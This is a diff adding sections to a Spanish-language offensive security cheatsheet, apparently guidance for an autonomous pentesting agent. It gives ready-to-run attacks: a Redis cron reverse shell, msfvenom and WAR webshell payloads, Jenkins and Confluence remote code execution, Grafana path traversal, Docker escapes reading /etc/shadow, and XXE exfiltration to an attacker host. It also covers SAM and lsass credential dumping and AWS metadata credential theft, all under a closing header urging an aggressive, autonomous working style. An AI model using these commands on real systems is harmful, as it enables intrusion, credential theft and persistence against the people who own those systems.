@@ -85,19 +85,26 @@ Recon y scanning de red:
 - tcpdump, tshark (captura/análisis de tráfico)
 
 Web testing:
-- ffuf — fuzzer de referencia, mucho más rápido que gobuster (recomendado).
+- ffuf — fuzzer de referencia, rápido (recomendado).
   `ffuf -u https://X/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt -mc 200,301,403`
-- katana — crawler moderno de ProjectDiscovery con headless y JS parsing.
+- feroxbuster — recursive content discovery (Rust, mejor que gobuster para recursión).
+  `feroxbuster -u URL -w wordlist -d 3 -k`
+- katana — crawler moderno de ProjectDiscovery con headless y JS parsing
 - gobuster / dirb / dirsearch / wfuzz — alternativas para dir/vhost busting
 - nikto — vulnerabilidades web conocidas
 - sqlmap — detección y explotación de SQLi (`sqlmap -u "URL" --batch --dbs`)
 - commix — command injection scanner
-- dalfox — XSS scanner especializado, payloads encadenados (`dalfox url URL`)
+- dalfox — XSS scanner especializado (`dalfox url URL`)
+- xsstrike — XSS scanner avanzado con bypass de WAF (`xsstrike -u URL --params`)
 - arjun — descubre parámetros HTTP ocultos (`arjun -u URL`)
+- paramspider — extrae parámetros del archivo wayback (`paramspider -d dominio.com`)
+- whatwaf — detección de WAF (`whatwaf -u URL`)
 - wpscan — WordPress (`wpscan --url URL --enumerate vp,vt,u`)
 - whatweb — fingerprinting de stack
 - sslscan — análisis TLS/SSL
 - mitmproxy — proxy de interceptación
+- gowitness — screenshot URLs en masa (recon visual rápido)
+- subzy — scanner de subdomain takeover (`subzy run --targets subs.txt`)
 - naabu — port scanner Go rápido (alternativa a nmap para barridos grandes)
 - dnsx — DNS toolkit Go (resolve/brute/PTR/SRV)
 
@@ -113,6 +120,8 @@ SMB / AD / Windows (toolkit completo):
   sam, ntds dump, kerberoasting…).
 - bloodhound-python (`bloodhound-python -d DOMAIN -u user -p pass -ns DC -c All`) —
   ingest para mapear paths de ataque en BloodHound.
+- bloodyAD — alternativa con ataques offensive built-in (cambiar pass de user,
+  añadir DCSync, RBCD, shadow credentials desde CLI).
 - certipy-ad — explotación AD CS (ESC1-ESC11 y vías derivadas).
 - pypykatz — mimikatz puro Python para extraer creds offline (lsass.dmp, SAM,
   SECURITY, NTDS.dit). `pypykatz lsa minidump lsass.dmp`.
@@ -120,6 +129,9 @@ SMB / AD / Windows (toolkit completo):
 - kerbrute — bruteforce/userenum Kerberos.
 - evil-winrm — shell WinRM con upload/download (`evil-winrm -i IP -u user -p pass`).
 - responder — envenenar LLMNR/NBT-NS/MDNS y capturar hashes NetNTLM.
+- mitm6 — IPv6 spoofing + WPAD para capturar credenciales en redes Windows.
+- ldapdomaindump — dump completo de info LDAP (users, computers, GPO, ACLs)
+  en HTML/JSON/grep. `ldapdomaindump -u DOMAIN\\user -p pass DC_IP`
 - smbclient, enum4linux-ng, ldap-utils (ldapsearch).
 - impacket (`psexec.py`, `wmiexec.py`, `secretsdump.py`, `GetNPUsers.py`,
   `GetUserSPNs.py`, `ntlmrelayx.py`).
@@ -142,6 +154,16 @@ Forense / esteganografía / binarios:
 
 Cloud (AWS):
 - awscli — cuando tienes credenciales filtradas para test de IAM, S3, etc.
+- s3scanner — buckets S3 abiertos (`s3scanner scan -b list.txt`)
+
+Secret scanning (en repos clonados o filesystems):
+- gitleaks — escaneo rápido de git history
+- trufflehog — más agresivo, valida secrets contra APIs reales para confirmar:
+  `trufflehog filesystem /path` o `trufflehog git https://github.com/org/repo`
+
+CTF crypto:
+- rsactftool — ataques automáticos a RSA débil (factordb, Wiener, common factors,
+  Fermat, etc.). `rsactftool --publickey key.pub --uncipherfile cipher.bin`
 
 Wordlists: /opt/SecLists (rockyou, common-passwords, web-fuzzing, usernames…).
 
@@ -585,6 +607,223 @@ hashcat -m 5600 hash.txt rockyou.txt          # NetNTLMv2
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
 msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php
+```
+
+## Stack-specific — qué probar al identificar la tecnología
+
+**WordPress** (whatweb / Wappalyzer dice "WordPress"):
+- `wpscan --url URL --enumerate vp,vt,u --api-token TOKEN` (token gratis en wpscan.com)
+- Login default: admin/admin, admin/password. Brute con `wpscan --url URL -U admin -P rockyou.txt`
+- xmlrpc: `curl -X POST URL/xmlrpc.php -d '<?xml...?><methodCall>...'` para amplificar bruteforce
+- Plugin/theme files: `URL/wp-content/plugins/PLUGIN/readme.txt` para versión → searchsploit
+- `URL/wp-config.php` rara vez accesible, pero prueba `wp-config.php.bak`, `wp-config.old`, `.swp`
+- Si tienes editor de tema/plugin → RCE pegando PHP en el editor
+
+**Drupal** (whatweb dice "Drupal"):
+- `droopescan scan drupal -u URL`
+- CVEs comunes: Drupalgeddon (CVE-2014-3704 — D7), Drupalgeddon2 (CVE-2018-7600 — D7/D8)
+- `URL/CHANGELOG.txt` filtra versión
+
+**Joomla**: `joomscan -u URL` (gem) o `nuclei -u URL -t /opt/SecLists/.../joomla` (no, nuclei no tiene esto pre — usa templates de joomla)
+
+**Apache Tomcat** (banner en :8080 o :8443):
+- `URL/manager/html` con auth basic. Default: tomcat/tomcat, admin/admin, tomcat/s3cret, tomcat/password
+- Si entras: subir `.war` con webshell → `msfvenom -p java/jsp_shell_reverse_tcp -f war > shell.war` → deploy → trigger
+- `URL/host-manager/html` también
+
+**Spring Boot Actuator** (puertos 8080/9000/etc.):
+- Endpoints: `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`, `/actuator/jolokia`, `/actuator/gateway/routes`
+- Heapdump: descarga, abre con visualvm o `strings | grep -i 'password\|secret\|token'`
+- Jolokia → MBean → arbitrary class load → RCE
+- Spring4Shell (CVE-2022-22965): payload conocido contra Spring MVC con WAR
+
+**Jenkins** (típicamente :8080):
+- `URL/script` (Groovy console) → si llegas, RCE directo: `Runtime.getRuntime().exec("bash -c {echo,...}|{base64,-d}|bash")`
+- `URL/asynchPeople/`, `URL/securityRealm/user/admin/`
+- Anonymous build con permiso de configurar = RCE
+- CVE-2024-23897: arbitrary file read en CLI
+
+**Confluence/Jira**:
+- Confluence CVE-2022-26134 (OGNL injection): `curl 'URL/${(...)Runtime.getRuntime().exec("id")}.action'`
+- CVE-2023-22515 — auth bypass create admin
+- Jira info disclosure: `URL/rest/api/2/user/picker?query=admin`
+
+**GitLab**:
+- CVE-2021-22205 (RCE pre-auth con ExifTool en uploads)
+- `URL/.well-known/security.txt`
+- API: `/api/v4/users`, `/api/v4/projects` con/sin token
+
+**phpMyAdmin**:
+- Default: root/root, root/(vacío). Probar `/phpmyadmin/sql.php` post-auth
+- Si tienes login → SELECT INTO OUTFILE para escribir webshell en webroot
+
+**Grafana**:
+- CVE-2021-43798 file read: `curl URL/public/plugins/PLUGIN/../../../../../../etc/passwd` (PLUGIN = alertlist, etc.)
+- Default: admin/admin
+
+**Elasticsearch** (:9200): `URL/_cat/indices`, `URL/_search?q=*` — datos sin auth
+
+**MongoDB** (:27017): `mongo HOST:27017` sin auth, `show dbs`, `use db; db.collection.find()`
+
+**Redis** (:6379): `redis-cli -h IP`. Si no hay auth → `CONFIG SET dir /var/spool/cron/crontabs; CONFIG SET dbfilename root; SET x "\n*/1 * * * * bash -i >& /dev/tcp/IP/4444 0>&1\n"; SAVE` para persistencia
+
+**Docker daemon expuesto** (:2375 sin TLS): `docker -H IP:2375 ps`, luego `docker -H IP:2375 run --rm -v /:/host alpine cat /host/etc/shadow` = root host
+
+**Kubernetes API server** (:6443, :8001 dashboard): `curl -k URL:6443/api/v1/namespaces` sin auth a veces da info
+
+## API testing — REST y GraphQL
+
+**Discovery REST**:
+```
+ffuf -u URL/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt
+ffuf -u URL/api/FUZZ -w wordlist.txt
+# Específicos:
+URL/swagger.json  URL/swagger-ui.html  URL/api-docs  URL/openapi.json
+URL/api/v1  URL/api/v2  URL/v1/users  URL/admin/api
+```
+Si encuentras swagger/openapi → te lista TODOS los endpoints con sus params. Mina de oro.
+
+**IDOR test**: ID propio → cambia por ID de otro user (incrementa, decrementa, GUID guess). Test con `Edit and Resend` en DevTools Network.
+
+**Mass assignment** (sobrescribir campos no expuestos): si registro toma `{name, email}` prueba `{name, email, role: "admin", isAdmin: true, is_staff: true}`.
+
+**HTTP method confusion**: prueba `GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS`, `HEAD` en cada endpoint. A veces solo POST está protegido.
+
+**GraphQL**:
+```
+# Introspection (si está habilitada — fail abierto):
+curl -X POST URL/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
+
+# Si introspection cerrada, fingerprinting con typos para sacar errores que listan tipos:
+curl -X POST URL/graphql -d '{"query":"{ qwertyuiop }"}'
+
+# Auth bypass clásico: __schema mientras el resto requiere auth
+# Batch queries para bruteforce (1 request, N intentos):
+[{"query":"mutation{login(u:\"admin\",p:\"a\"){token}}"},
+ {"query":"mutation{login(u:\"admin\",p:\"b\"){token}}"}]
+
+# Tools: clairvoyance (recovery de schema sin introspect), graphql-cop (audit)
+```
+
+## Container escape — si encuentras Docker dentro
+
+Detección de container: `ls -la /.dockerenv`, `cat /proc/1/cgroup | grep -i docker`, `cat /proc/self/status | grep CapEff`.
+
+**Vías de escape**:
+- `/var/run/docker.sock` montado: `docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine cat /host/etc/shadow`
+- `--privileged`: monta dispositivos host. `mount /dev/sda1 /mnt; chroot /mnt /bin/bash`
+- `cap_sys_admin`: similar; mount o cgroup release_agent abuse (CVE-2022-0492)
+- cgroup v1 release_agent: escribir un payload + tirar a `release_agent` ejecuta como root host
+- `--net=host`: acceso a localhost del host (puertos internos)
+- `cap_dac_read_search`: leer archivos del host vía `/proc/<host_pid>/root/...`
+
+## XXE — XML External Entity
+
+```xml
+<!-- Lectura de archivo (clásico) -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- SSRF interno -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.lab/admin">]>
+
+<!-- Out-of-band exfil cuando no hay output reflejado -->
+<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://ATTACKER/dtd.xml">
+%dtd;]>
+<!-- En dtd.xml en attacker:
+<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
+%all; -->
+
+<!-- PHP-specific: php://filter para leer fuente -->
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+
+<!-- Billion laughs (DoS, evitar en bug bounty real) -->
+```
+
+Endpoints típicos: SOAP, parse de feeds RSS/Atom, upload de SVG, upload de DOCX/XLSX (son ZIP con XML), fileupload con XSPF/RSS.
+
+## Privesc Windows avanzado — privilegios Se* específicos
+
+```
+whoami /priv
+```
+Mapeo de privilegios → técnica:
+- **SeImpersonatePrivilege** / **SeAssignPrimaryTokenPrivilege**: PrintSpoofer / GodPotato (Win10/Server2019+) o JuicyPotato (servidores viejos hasta 2016).
+- **SeBackupPrivilege**: backup SAM y SYSTEM, extraer hashes con secretsdump.
+  ```
+  reg save HKLM\SAM C:\temp\SAM
+  reg save HKLM\SYSTEM C:\temp\SYSTEM
+  # offline en attacker:
+  secretsdump.py LOCAL -sam SAM -system SYSTEM
+  ```
+- **SeRestorePrivilege**: escribir cualquier archivo (sobreescribir DLL del sistema).
+- **SeTakeOwnershipPrivilege**: tomar ownership de archivos protegidos → cambiar ACL → modificar.
+- **SeLoadDriverPrivilege**: cargar driver malicioso (ej. Capcom.sys exploit).
+- **SeManageVolumePrivilege**: tricks con shadow copy.
+- **SeDebugPrivilege**: dump de lsass para credenciales.
+- **SeTcbPrivilege** = "act as part of OS" = casi root, raro.
+
+**Service hijacking** patterns:
+- Unquoted service path con espacios y dirs escribibles intermedios: dropea `C:\Program.exe`.
+- Weak ACL en service binary o config (sc qc; accesschk.exe).
+- DLL hijacking en programa que carga desde dir escribible.
+- AlwaysInstallElevated (los dos reg keys =1) → MSI elevado.
+
+**Scheduled Tasks**: `schtasks /query /v`, mira tareas con SYSTEM y binarios reescribibles.
+
+## Linux kernel exploits cheatsheet
+
+Mira `uname -a` y `cat /etc/os-release` primero. Luego:
+
+| CVE | Versión vulnerable | Notas |
+|---|---|---|
+| **CVE-2022-0847** Dirty Pipe | kernel 5.8 → 5.16.10 | Sobrescribe archivos read-only (ej. /etc/passwd para nuevo root). Exploit estable. |
+| **CVE-2021-4034** PwnKit | polkit < 0.119 | LPE local universal. Compila el C, ejecuta. Casi cualquier distro entre 2009-2022. |
+| **CVE-2022-2588** | kernel 3.4 → 5.18 | use-after-free en cls_route. Difícil de explotar. |
+| **CVE-2023-32233** | kernel 6.1.x | nf_tables UAF. |
+| **CVE-2017-1000112** | kernel 4.4-ish | UDP fragmentation. |
+| **CVE-2016-5195** Dirty COW | kernel 2.6.x → 4.8 | Clásico de máquinas viejas. |
+| **CVE-2022-32250** | kernel 5.18.x | nf_tables UAF, similar a 32233. |
+| **CVE-2023-22809** | sudoedit 1.8.0 → 1.9.12p1 | Si tienes sudoedit en sudo -l, escribe /etc/passwd. |
+
+`searchsploit linux kernel VERSION` y `searchsploit polkit` para opciones rápidas. Para PwnKit: clona del repo (`github.com/berdav/CVE-2021-4034`), `make`, ejecuta.
+
+## AWS pentesting — recetas rápidas
+
+```
+# Identidad actual (siempre primero)
+aws sts get-caller-identity
+
+# Enum IAM (la más jugosa)
+aws iam list-users
+aws iam list-roles
+aws iam list-attached-user-policies --user-name USER
+aws iam get-user-policy --user-name USER --policy-name POLICY
+
+# S3 buckets — anónimo (no requiere auth)
+aws s3 ls --no-sign-request s3://bucket-name
+aws s3 cp --no-sign-request s3://bucket-name/file.txt -
+
+# S3 con auth — ¿qué buckets ves?
+aws s3 ls
+aws s3 ls s3://nombre-detectado --recursive
+
+# EC2 metadata (desde dentro de una EC2 / SSRF que la apunte)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE   # → temp creds
+# IMDSv2 requiere token primero:
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+
+# Lambda env vars (si entras a una Lambda con /proc accesible)
+cat /proc/self/environ
+# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN están en env
+
+# Buckets abiertos al mundo:
+s3scanner scan -b bucket-list.txt -o findings.json
 ```
 
 # Estilo de trabajo: agresivo y autónomo
